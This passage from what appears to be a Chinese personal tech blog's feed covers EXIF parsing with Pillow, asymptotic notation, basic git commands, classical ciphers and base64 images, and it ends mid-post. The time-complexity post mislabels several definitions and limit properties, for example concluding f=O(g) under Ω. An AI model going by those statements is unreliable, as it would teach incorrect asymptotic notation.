包含自己偏移量值的本身, 到下一个IFD为止的 长度的字节数. 通常地第一个 IFD 是紧挨着 TIFF 头出现的, 因此这个偏移量的值是 ‘0x00000008’<br><img src="/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/7.jpg" alt><br>我选的这张图就是大端,所以0x4d4d，接着的是0x002a，第一个IFD是紧贴TIFF，所以接下来的是0x00000008。</p><h3 id="IFD"><a href="#IFD" class="headerlink" title="IFD"></a>IFD</h3><p>IFD是图像文件目录。<br>紧接TIFF头后是第一个IFD，前两个字节表示后面更了多少目录项，在最后一个目录项之后, 有 一个4个字节大小的数据,它意味着到下一个IFD的偏移量。如果这个值是’0x00000000’,则表示它是最后一个IFD 并且不在跟任何的 IFD 相连接。<br>我这张图有7个目录项<br><img src="/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/8.jpg" alt><br>每个目录项由12个字节构成<br>2字节标签号码，表示数据种类，2字节数据格式，4字节组件数目，4字节数据或者偏移量。<br>数据种类对应的意义如下表1</p><table border="1">    <tbody>        <tr>            <td>数据的值</td>            <td>1</td>            <td>2</td>            <td>3</td>            <td>4</td>            <td>5</td>            <td>6</td>        </tr>        <tr>            <td>格式</td>            <td>unsigned byte</td>            <td>ascii strings</td>            <td>unsigned short</td>            <td>unsigned long</td>            <td>unsigned rational</td>            <td>signed byte</td>        </tr>        <tr>            <td>组件的大小(字节数)</td>            <td>1</td>            <td>1</td>            <td>2</td>            <td>4</td>            <td>8</td>            <td>1</td>        </tr>        <tr>            <td colspan="7"></td>        </tr>        <tr>            <td>数据的值</td>            <td>7</td>            <td>8</td>            <td>9</td>            <td>10</td>            <td>11</td>            <td>12</td>        </tr>        <tr>            <td>格式</td>            <td>undefined</td>            <td>signed short</td>            <td>signed long</td>            <td>signed rational</td>            <td>single float</td>            <td>double float</td>        </tr>        <tr>            <td>组件的大小(字节数)</td>            <td>1</td>            <td>2</td>            <td>4</td>            <td>8</td>            <td>4</td>            <td>8</td>        </tr>    </tbody></table><p>标签号码对应的意义如下表2</p><table>    <tbody>        <tr>            <td colspan="5">            <center><font size="+1"><strong>IFD0 (主图像)使用的标签</strong></font></center></td>        </tr>        <tr>            <td>标签号</td>            <td>标签名</td>            <td>格式</td>            <td>组件数</td>            <td>描述</td>        </tr>        <tr>            <td>0x010e</td>            <td>ImageDescription </td>            <td>ascii string</td>            <td><br></td>            <td>用来描述图像. 双字节的字符码不能使用, 如 中文/韩文/日文.</td>        </tr>        <tr>            <td>0x010f</td>            <td>Make </td>            <td>ascii string</td>            <td><br></td>            <td>表示数字相机的制造商. 在 Exif 标准中, 这个标签是可选的, 但是在DCF中它是必需的.</td>        </tr>        <tr>            <td>0x0110</td>            <td>Model </td>            <td>ascii string</td>            <td><br></td>            <td>表示数字相机的模块代码. 在 Exif 标准中, 这个标签是可选的, 但在DCF中它也是必需的.</td>        </tr>        <tr>            <td>0x0112</td>            <td>Orientation </td>            <td>unsigned short</td>            <td>1 </td>            <td>            <table align="right">                <tbody>                    <tr>                        <td>Value</td>                        <td>0th Row</td>                        <td>0th Column</td>                    </tr>                    <tr>                        <td>1</td>                        <td>top</td>                        <td>left side</td>                    </tr>                    <tr>                        <td>2</td>                        <td>top</td>                        <td>right side</td>                    </tr>                    <tr>                        <td>3</td>                        <td>bottom</td>                        <td>right side</td>                    </tr>                    <tr>                        <td>4</td>                        <td>bottom</td>                        <td>left side</td>                    </tr>                    <tr>                        <td>5</td>                        <td>left side</td>                        <td>top</td>                    </tr>                    <tr>                        <td>6</td>                        <td>right side</td>                        <td>top</td>                    </tr>                    <tr>                        <td>7</td>                        <td>right side</td>                        <td>bottom</td>                    </tr>                    <tr>                        <td>8</td>                        <td>left side</td>                        <td>bottom</td>                    </tr>                </tbody>            </table>            当拍照时, 相机相对于场景的方向. 在右边表示的是'0th row' 以及 '0th column' 在视觉位置上的关系.</td>        </tr>        <tr>            <td>0x011a</td>            <td>XResolution </td>            <td>unsigned rational</td>            <td>1 </td>            <td rowspan="2">图像的 显示/打印 分辨率. 缺省值是 1/72英寸, 但是它没有意义因为个人PC在 显示/打印 图像的时候不使用这个值.</td>        </tr>        <tr>            <td>0x011b</td>            <td>YResolution </td>            <td>unsigned rational</td>            <td>1 </td>        </tr>        <tr>            <td>0x0128</td>            <td>ResolutionUnit </td>            <td>unsigned short</td>            <td>1 </td>            <td>XResolution(0x011a)/YResolution(0x011b)的单位. '1' 表示没有单位, '2' 意味着英寸, '3' 表示厘米. 缺省值是 '2'(英寸).</td>        </tr>        <tr>            <td>0x0131</td>            <td>Software </td>            <td>ascii string</td>            <td><br></td>            <td>显示固件的版本号(数字相机的内部控制软件).</td>        </tr>        <tr>            <td>0x0132</td>            <td>DateTime </td>            <td>ascii string</td>            <td>20 </td>            <td>图像最后一次被修改时的日期/时间. 日期的格式是 "YYYY:MM:DD HH:MM:SS"+0x00, 一共 20个字节. 如果没有设置时钟或者数字相机没有时钟, 则这个域是用空格来填充. 通常, 它和DateTimeOriginal(0x9003)具有相同的值</td>        </tr>        <tr>            <td>0x013e</td>            <td>WhitePoint </td>            <td>unsigned rational</td>            <td>2 </td>            <td>定义图像白点(white point/白点：在彩色分色、照相或摄影时作为色彩平衡测量用途的参考点) 的色度(chromaticity). 如果图像是用CIE标准照度 D65(著名的是 '光线/daylight'的国际标准), 这个值是 '3127/10000,3290/10000'.</td>        </tr>        <tr>            <td>0x013f</td>            <td>PrimaryChromaticities </td>            <td>unsigned rational</td>            <td>6 </td>            <td>定义图像的原始色度. 如果图像使用 CCIR 推荐 709原始色度, 则这个值是 '640/1000,330/1000,300/1000,600/1000,150/1000,0/1000'.</td>        </tr>        <tr>            <td>0x0211</td>            <td>YCbCrCoefficients </td>            <td>unsigned rational</td>            <td>3 </td>            <td>当图像的格式是 YCbCr(JPEG的格式), 这个值表示转换成 RGB格式的一个常量. 通常, 这个值是'0.299/0.587/0.114'.</td>        </tr>        <tr>            <td>0x0213</td>            <td>YCbCrPositioning </td>            <td>unsigned short</td>            <td>1 </td>            <td>当图像的格式是 YCbCr 并且使用 '子采样/Subsampling'(色度数据的剪切值, 所有的数字相机都使用), 定义了subsampling 像素阵列的色度采样点. '1'表示像素阵列的中心, '2' 表示基准点.</td>        </tr>        <tr>            <td>0x0214</td>            <td>ReferenceBlackWhite </td>            <td>unsigned rational</td>            <td>6 </td>            <td>表示黑点(black point)/白点 的参考值. 在YCbCr 格式中,前两个值是 Y的黑点/白点, 下两个值是 Cb, 最后两个值是 Cr. 而在 RGB 格式中, 前两个表示R的黑点/白点, 下两个是 G, 最后两个是 B.</td>        </tr>        <tr>            <td>0x8298</td>            <td>Copyright </td>            <td>ascii string</td>            <td><br></td>            <td>表示版权信息</td>        </tr>        <tr>            <td>0x8769</td>            <td>ExifOffset </td>            <td>unsigned long</td>            <td>1 </td>            <td>Exif 子IFD的偏移量</td>        </tr>    </tbody></table><p>比如我们在这随便选一个目录项分析<br><img src="/2020/02/25/%E5%9B%BE%E7%89%87%E3%81%AEEXIF%E4%BF%A1%E6%81%AF/9.jpg" alt><br>0x0112  0003 00000001 00010000<br>0x0112 根据表2，表示这个标签是Orientation<br>0x0003 根据表1，表示数据格式是unsigned short<br>0x00000001 表示只有一个组件<br>0x00010000 表示所对应的值。（咋感觉不对劲啊？）</p><p>这些细节还有很多，在我最前面贴的链接里都能意义对照。</p><h2 id="提取某些EXIF信息"><a href="#提取某些EXIF信息" class="headerlink" title="提取某些EXIF信息"></a>提取某些EXIF信息</h2><p>包括java、python的很多语言都有对应的库实现，本来上面讲解那么细致应该是自己亲自动手实现的，但是我不走寻常路<br>我们用一手PIL（python imaging library）库<br>这是他的 <a href="https://pillow.readthedocs.io/en/stable/PIL.html">手册</a><br>这里有一个小点要注意，那就是PIL这个库改名叫pillow了，所以我们如果用pip安装他的话得用<br><code>pip install Pillow -i https://pypi.tuna.tsinghua.edu.cn/simple</code><br>然后是我们的脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line">from PIL.ExifTags import TAGS</span><br><span class="line"></span><br><span class="line">def get_exif_data(fname):</span><br><span class="line">    &quot;&quot;&quot;Get embedded EXIF data from image file.&quot;&quot;&quot;</span><br><span class="line">    ret &#x3D; &#123;&#125;</span><br><span class="line">    try:</span><br><span class="line">        img &#x3D; Image.open(fname)</span><br><span class="line">        if hasattr( img, &#39;_getexif&#39; ):</span><br><span class="line">            exifinfo &#x3D; img._getexif()</span><br><span class="line">            if exifinfo !&#x3D; None:</span><br><span class="line">                for tag, value in exifinfo.items():</span><br><span class="line">                    decoded &#x3D; TAGS.get(tag, tag)</span><br><span class="line">                    ret[decoded] &#x3D; value</span><br><span class="line">    except IOError:</span><br><span class="line">        print (&#39;IOERROR &#39; + fname)</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    fileName &#x3D; &#39;D:\\1.jpg&#39;</span><br><span class="line">    exif &#x3D; get_exif_data(fileName)</span><br><span class="line">    print (exif)</span><br></pre></td></tr></table></figure><p>利用PIL的ExifTags模块，我们可以提取出对应的Exif标签。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>只要后期对脚本进行相应的改动即可得出想要的结果。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;今天的导语不想写了，么么哒。&lt;br&gt;反正蒙头就放EXIF的文档就完事了！&lt;br&gt;&lt;a href=&quot;http://www.cipa.jp/std/documents/e/DC-008-2012_E.pdf&quot;&gt;Exif 2.3官方标准&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://web.archive.org/web/20111025004429/http://park2.wakwak.com/~tsuruzoh/Computer/Digicams/exif-e.html&quot;&gt;Exif文件格式说明&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="数字取证" scheme="https://blog.pillar.fun/tags/%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>算法的时间复杂度</title>
    <link href="https://blog.pillar.fun/2020/02/22/%E7%AE%97%E6%B3%95%E7%9A%84%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6/"/>
    <id>https://blog.pillar.fun/2020/02/22/%E7%AE%97%E6%B3%95%E7%9A%84%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6/</id>
    <published>2020-02-22T08:34:47.000Z</published>
    <updated>2020-03-21T04:57:09.278Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>算法是程序猿们必修的一门功课，它指：1.为解决某一问题定义的计算过程；2.是通过一个有限的指令序列集合对特定问题进行求 解的一种计算执行描述。评估一个算法的优劣的方式是复杂度，今天来具体讲一讲时间复杂度的计算方法。</p><a id="more"></a><p>典型的时间复杂度函数和他们对应的时间如下图<br><img src="https://raw.githubusercontent.com/such-stupid6/such-stupid6.github.io/master/image/%E7%AE%97%E6%B3%95%E7%9A%84%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6/TIM%E6%88%AA%E5%9B%BE20200222164836.png" alt="典型的时间复杂度函数和他们对应的时间"></p><h1 id="四个符号"><a href="#四个符号" class="headerlink" title="四个符号"></a>四个符号</h1><h2 id="O符号"><a href="#O符号" class="headerlink" title="O符号"></a>O符号</h2><p>假设：f(n)和g(n)是从自然数集到非负实数集里的两个函数<br>定义：如果存在正的常数C和自然数n0，使得当n≥n0时，有f(n)≤C·g(n)，则称函数f(n) 在n 充分大时有上有界，且g(n) 是它的一个上界，记做f(n)=O(g(n))<br>人话：当自变量大于某个值以后，f的函数值永远小于g的函数值乘以一个常数。<br>在这里，我们要明确的是，对于 $an^2+bn+c$，在n很大的时候，$a$、$bn+c$是不起作用的，也就是说，在进行阶的运算时，常系数、低的阶和常数项可以忽略。<br>只要用这种放缩放缩来放缩$n^2$ &gt; nlogn &gt; n &gt; logn即可<br><strong>重要性质</strong>：如果有<br>$\lim\limits_{n\to+\infty}\frac{f(n)}{g(n)}\not=0$<br>那么f(n)=O(g(n))</p><h2 id="o符号"><a href="#o符号" class="headerlink" title="o符号"></a>o符号</h2><p>假设：f(n)和g(n)是从自然数集到非负实数集里的两个函数<br>定义：如果存在任意正的常数C和自然数n0，使得当n≥n0时，有0＜f(n)＜C·g(n)<br>人话：结合O符号看，这里主要的问题是要求对任意c都成立f(n)小于c·g(n)，也就是说要求g(n)和f(n)在数量级上有区分，当n趋于正无穷的时候f(n)相较于g(n)微不足道。在取极限的性质对比比较明显：<br><strong>重要性质</strong>：如果有<br>$\lim\limits_{n\to+\infty}\frac{f(n)}{g(n)}=0$<br>那么f(n)=o(g(n))</p><h2 id="Ω符号"><a href="#Ω符号" class="headerlink" title="Ω符号"></a>Ω符号</h2><p>假设：f(n)和g(n)是从自然数集到非负实数集里的两个函数<br>定义：如果存在正的常数C和自然数n0，使得当n≥n0时，有f(n)≥C·g(n)，则称函数f(n)在n充分大时有下有界，且g(n)是它的一个下界，记做f(n)= Ω(g(n))<br>人话：当自变量大于某个值以后，f的函数值永远小于g的函数值乘以一个常数。<br>和O符号就换汤不换药呗。<br><strong>重要性质</strong>：如果有<br>$\lim\limits_{n\to+\infty}\frac{f(n)}{g(n)}\not=0$<br>那么f(n)=O(g(n))</p><h2 id="θ符号"><a href="#θ符号" class="headerlink" title="θ符号"></a>θ符号</h2><p>假设：f(n)和g(n)是从自然数集到非负实数集里的两个函数<br>定义：如果存在正的常数C和自然数n0，使得当n≥n0时，$C_1·$≤f(n)≤$C_2$·g(n)，则称函数f(n)在n充分大时有下有界，且g(n)是它的一个渐近确界，记做f(n)= θ(g(n))<br>人话：能同时整出来O和Ω就是θ<br><strong>重要性质</strong>：如果有<br>$\lim\limits_{n\to+\infty}\frac{f(n)}{g(n)}=c$（其中c是一个大于零的常数）<br>那么f(n)=Ω(g(n))<br>换言之，O和Ω符号的极限可以是无穷，而θ符号必须是一个确定的数字。</p><h1 id="评估价值"><a href="#评估价值" class="headerlink" title="评估价值"></a>评估价值</h1><p>对于上界O和o，阶越小价值越高。（我随便那个算法都小于$n^∞$，这显然没意义）<br>对于下界Ω，阶约大价值越高。<br>对于渐近确界θ，稳！</p><p>但是我们常常找不到θ，而且对于性能评估肯定是希望越快越好，所以Ω用的也很少，一般评估都用O符号来看哒。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;算法是程序猿们必修的一门功课，它指：1.为解决某一问题定义的计算过程；2.是通过一个有限的指令序列集合对特定问题进行求 解的一种计算执行描述。评估一个算法的优劣的方式是复杂度，今天来具体讲一讲时间复杂度的计算方法。&lt;/p&gt;</summary>
    
    
    
    
    <category term="算法分析" scheme="https://blog.pillar.fun/tags/%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>憨憨的git使用教程（1）</title>
    <link href="https://blog.pillar.fun/2020/01/28/%E6%86%A8%E6%86%A8%E7%9A%84git%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%881%EF%BC%89/"/>
    <id>https://blog.pillar.fun/2020/01/28/%E6%86%A8%E6%86%A8%E7%9A%84git%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B%EF%BC%881%EF%BC%89/</id>
    <published>2020-01-28T07:49:14.000Z</published>
    <updated>2021-03-24T05:00:17.965Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>git一开始在linux平台使用，但后来我们也移植到了windows。git在多人协作的软件开发非常有用，但是我是憨憨，不咋会用。所以学习了git使用，搁着做个简单的学习笔记。</p><a id="more"></a><h1 id="git简介"><a href="#git简介" class="headerlink" title="git简介"></a>git简介</h1><p><a href="https://git-scm.com/">git</a> 是一个版本控制工具。说到版本控制，git一般横向对比于SVN，他们有如下的区别点。</p><ol><li><strong>Git 是分布式的，SVN 不是</strong>：这是 Git 和其它非分布式的版本控制系统，例如 SVN，CVS 等，最核心的区别。</li><li><strong>Git 把内容按元数据方式存储，而 SVN 是按文件</strong>：所有的资源控制系统都是把文件的元信息隐藏在一个类似 .svn、.cvs 等的文件夹里。</li><li><strong>Git 分支和 SVN 的分支不同</strong>：分支在 SVN 中一点都不特别，其实它就是版本库中的另外一个目录。</li><li><strong>Git 没有一个全局的版本号，而 SVN 有</strong>：目前为止这是跟 SVN 相比 Git 缺少的最大的一个特征。</li><li><strong>Git 的内容完整性要优于 SVN</strong>：Git 的内容存储使用的是 SHA-1 哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。</li></ol><p><a href="git-scm.com/docs">git完整命令手册</a></p><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>在官网上即可找到对应平台的安装包</p><h2 id="创建一个新的仓库"><a href="#创建一个新的仓库" class="headerlink" title="创建一个新的仓库"></a>创建一个新的仓库</h2><p>bash作为终端的平台上只需要到对应的目录下输入<br><code>git init</code><br>即可，而windwos平台使用powershell或者cmd其实也是一个意思。但是git在安装的时候给我们安装了一个Git bash，也就是一个模拟bash，所以我们也可以到想建仓库的地方右键打开git bash然后输入git init，我个人觉得cmd和powershell搞了这么久其实很多bash功能都可以实现了，但是他们推荐在bash终端下面搞，那么我们用git bash搞也挺好。</p><h2 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h2><p>翻译是检出仓库，就是把一个仓库里面的所有代码复制到你所在的仓库里。<br>如果你要从本地的另一个仓库clone，那么使用下面的代码。<br><code>git clone /path/to/repository</code><br>如果你要从远程服务器上的仓库，那么使用下面的代码<br><code>git clone username@host:/path/to/repository</code></p><h2 id="工作流"><a href="#工作流" class="headerlink" title="工作流"></a>工作流</h2><p>你的本地仓库由 git 维护的三棵“树”组成。第一个是你的 <strong>工作目录</strong>，它持有实际文件；第二个是 <strong>暂存区（Index）</strong>，它像个缓存区域，临时保存你的改动；最后是 <strong>HEAD</strong>，它指向你最后一次提交的结果。<br>如何利用dir index和head添加和提交呢？<br>使用下面的代码将代码存到暂存区<br><code>git add &lt;filename&gt;</code><br>这里通配符*也是作数的，也就是说可以使用git add *这样的代码<br>使用下面的代码将缓存区的代码提交到HEAD<br><code>git commit -m &quot;代码提交信息&quot;</code><br>接下来就是将代码和远程服务器的远端仓库同步了。<br>如果你没有和一个远程服务器连接，使用下面的代码添加<br><code>git remote add origin &lt;server&gt;</code><br>这时，origin就代表了你的远端服务器server。<br>万事俱备，使用下面的代码将HEAD的代码“推”到远程服务器<br><code>git push origin master</code><br>这里的master是分支，可以修改的。我个人觉得分支可以说是非常有用的一个功能了，我在下一个标签里写分支的使用方式。</p><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><p>分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是“默认的”分支。在其他分支上进行开发，完成后再将它们合并到主分支上。<br>可以说你写了另一段代码，或许是你心血来潮，可能除了是一个很酷的点子以外，对你的项目的目标没有任何卵用，此时你又不想在你的成品代码中保存这些东西，你就可以新建一个分支，把你的代码存进去，说不定在以后的某个时候他就会变得非常有用了。<br>此外，对我们这种hexo搭的个人博客，我们也可以新建一个分支做backup，毕竟你存在.io里的东西都是hexo生成出来的网站，而你自己的md文件啥的都不在。</p><p>说了这么多，具体操作是什么呢<br>使用下面的代码创建一个分支并且切换过去(feature_x是起名字的地方)<br><code>git checkout -b feature_x</code><br>使用下面的代码切换分支(把master换成你想切换到的分支就行了)<br><code>git checkout master</code><br>使用下面的代码将分支删除<br><code>git branch -d feature_x</code><br>以及将这个分支push到远程服务器去<br><code>git push origin &lt;branch&gt;</code></p><p>比如我们的hexo备份，我们就可以在source目录哪儿里</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin ***.git</span><br><span class="line">git add .&#x2F;source</span><br><span class="line">git commit -m &quot;wharever you want to say&quot;</span><br><span class="line">git push origin backup</span><br></pre></td></tr></table></figure><p>然后我们的.io下面就会多一个分支，里面存着你的所有hexo源码</p><h2 id="更新与合并"><a href="#更新与合并" class="headerlink" title="更新与合并"></a>更新与合并</h2><p>使用下面的代码来获取（fetch）并合并（merge）远端的改动以将本地仓库更新到最新改动<br><code>git pull</code><br>要合并其他分支到你的当前分支（例如 master）使用<br><code>git merge &lt;branch&gt;</code><br>在这两种情况下，git 都会尝试去自动合并改动。遗憾的是，这可能并非每次都成功，并可能出现冲突（conflicts）。 这时候就需要你修改这些文件来手动合并这些冲突（conflicts）。改完之后，你需要执行如下命令以将它们标记为合并成功：<br><code>git add &lt;filename&gt;</code><br>在合并改动之前，你可以使用如下命令预览差异<br><code>git diff &lt;source_branch&gt; &lt;target_branch&gt;</code></p><h2 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h2><p>为软件发布创建标签是推荐的。这个概念早已存在，在 SVN 中也有。你可以执行如下命令创建一个叫做 1.0.0 的标签：<br><code>git tag 1.0.0 1b2e1d63ff</code><br>1b2e1d63ff 是你想要标记的提交 ID 的前 10 位字符。可以使用下列命令获取提交 ID：<br><code>git log</code><br>你也可以使用少一点的提交 ID 前几位，只要它的指向具有唯一性。</p><h2 id="替换本地改动"><a href="#替换本地改动" class="headerlink" title="替换本地改动"></a>替换本地改动</h2><p>假如你操作失误（当然，这最好永远不要发生），你可以使用如下命令替换掉本地改动：<br><code>git checkout -- &lt;filename&gt;</code><br>此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到暂存区的改动以及新文件都不会受到影响。<br>假如你想丢弃你在本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它：<br><code>git fetch origin</code><br><code>git reset --hard origin/master</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;git一开始在linux平台使用，但后来我们也移植到了windows。git在多人协作的软件开发非常有用，但是我是憨憨，不咋会用。所以学习了git使用，搁着做个简单的学习笔记。&lt;/p&gt;</summary>
    
    
    
    
    <category term="杂项" scheme="https://blog.pillar.fun/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>EZ密码</title>
    <link href="https://blog.pillar.fun/2020/01/24/EZ%E7%BC%96%E7%A0%81/"/>
    <id>https://blog.pillar.fun/2020/01/24/EZ%E7%BC%96%E7%A0%81/</id>
    <published>2020-01-24T07:58:22.000Z</published>
    <updated>2020-05-30T04:55:43.524Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>在我们个人构架的小计算机系统中，常常会用到一些简单的小密码，这些小密码可以让我们的信息更加隐秘，同时不需要服务器付出太大的计算代价，对于更加庞大的计算机系统，尤其是保密性十分重要的计算机系统，更会用很强的密码，今天来介绍一些简单的密码。</p><a id="more"></a><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>就是crypto=（plain+k） mod 26，是远古时期的密码，说到底人手写都可能自己就破解了。<br>其中ROT13密码就是k为13的凯撒密码</p><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><p>维吉尼亚密码的基础是凯撒密码，基本上就是加强了密钥的强度。在凯撒密码里，我们的密钥就是一个单纯的数字，而在维吉尼亚密码里，他变成了一个单词。<br>他的加密过程是：1、如果密钥没有明文长，那就多次重复密钥，让他和明文一样长。 2、对于明文中的第i位，加上密钥的第i位所代表的数字的凯撒密码<br>比如说我们设置维吉尼亚密码的单词为handsome，明文是gunishandsome，那么密文的对应是这样的<br>plain  gunishandsome<br>key    handsomehands<br>crypted g+h=o u+a=v……以此类推<br>这样就让破译变得困难了很多。</p><h2 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h2><p>栅栏密码其实就是调了下顺序，比如对<br>YOU ARE SO HANDSOME！<br>密钥可以为len(‘YOU ARE SO HANDSOME！’)=20的因子245.这里我们取4吧，然后横着写竖着读或者竖着写横着读<br>YASAO<br>ORONM<br>UE DE<br>  HS!<br>密文就是YASAOORONMUE DE  HS!</p><h2 id="培根密码"><a href="#培根密码" class="headerlink" title="培根密码"></a>培根密码</h2><p>这个相当于另类的摩斯密码，只不过密文不是.-而是大小写或者加粗不加粗<br>对应的密码表这是这样的<br><img src="/2020/01/24/EZ%E7%BC%96%E7%A0%81/f9dcd100baa1cd118c10fccdb512c8fcc2ce2dbd.jpg.png" alt></p><h2 id="猪圈密码"><a href="#猪圈密码" class="headerlink" title="猪圈密码"></a>猪圈密码</h2><p>猪圈密码是用格子来代表明文的，格子就是对应的密码表<br><img src="/2020/01/24/EZ%E7%BC%96%E7%A0%81/a9d3fd1f4134970ab5980d929dcad1c8a6865da7.jpg" alt><br><img src="/2020/01/24/EZ%E7%BC%96%E7%A0%81/eaf81a4c510fd9f9051910b0292dd42a2934a4d9.jpg.png" alt></p><h2 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h2><p>这就不多解释了<br>点杠吗，谁不到啊？</p><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>给大家一个好东西<br><a href="https://github.com/Acmesec/CTFCrackTools">CTFCrackTools</a><br>虽然我知道大家都可以自己手写脚本，但是我觉得光写这么点有点混，所以再搁这儿多BB两句。</p><p>以后再整一整密码学学好了的那些牛逼一点的密码哦~</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;在我们个人构架的小计算机系统中，常常会用到一些简单的小密码，这些小密码可以让我们的信息更加隐秘，同时不需要服务器付出太大的计算代价，对于更加庞大的计算机系统，尤其是保密性十分重要的计算机系统，更会用很强的密码，今天来介绍一些简单的密码。&lt;/p&gt;</summary>
    
    
    
    
    <category term="杂项" scheme="https://blog.pillar.fun/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://blog.pillar.fun/2020/01/16/%E5%9B%BE%E7%89%87base64%E7%BC%96%E7%A0%81/"/>
    <id>https://blog.pillar.fun/2020/01/16/%E5%9B%BE%E7%89%87base64%E7%BC%96%E7%A0%81/</id>
    <published>2020-01-15T16:00:00.000Z</published>
    <updated>2020-03-09T11:28:57.551Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>前端对图片的处理一直以来是一个非常值得研究的点。这里简单的介绍其中的一种：图片的base64编码</p><a id="more"></a><h1 id="什么是base64编码"><a href="#什么是base64编码" class="headerlink" title="什么是base64编码"></a>什么是base64编码</h1><p>Base64就是一种编码格式。Base64要求把每三个8Bit的字节转换为四个6Bit的字节（3<em>8 = 4</em>6 = 24），然后把6Bit再添两位高位0，组成四个8Bit的字节。编码后的字符串理论上比原本的数据长三分之一。<br>图片的base64编码就是将一幅图片的数据编码成字符串，使用这个字符串来代替图像的地址。</p><h1 id="base64编码图片的优缺点"><a href="#base64编码图片的优缺点" class="headerlink" title="base64编码图片的优缺点"></a>base64编码图片的优缺点</h1><p>网页上的所有图片，都是要一个http请求下载来的。举个例子你的博客里有4张图，采用的是网络链接取址，那么就会有4个http request去那些图片的地址将图片下载到浏览器的缓存来渲染页面，再加上本来需要下载html的一个request，整来就少说5个了。一般大家会整个图床啥的，这样问题也不是很大，因为request的负载都到图床去了，但是也有人在自己的服务器上搞相对地址，在并发高的情况下很有可能自己服务器就撑不住了。而base64是和html的request一起传输的，因此就会少很多的request。同时也不会有跨域请求，不需要定时清理图片的缓存了。<br>但是base64之后的字符串长度惊人，常常会分割代码，让整个代码非常的不好读。我们的md有一个id调用的方法来缓解。此外有些浏览器对base64图片不支持（IE8以下，应该没人还在用这了吧），也有些浏览器对base64的大小有限制。</p><h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>①减少了网络请求：采用http形式的url的话都会额外发送一次请求，网页发送的http请求次数越多，会造成页面加载速度越慢。<br>②不会造成跨域请求的问题：因为采用Base64编码的图片是随着页面一起加载的。<br>③不会造成清理图片缓存问题。</p><h2 id="缺点"><a href="#缺点" class="headerlink" 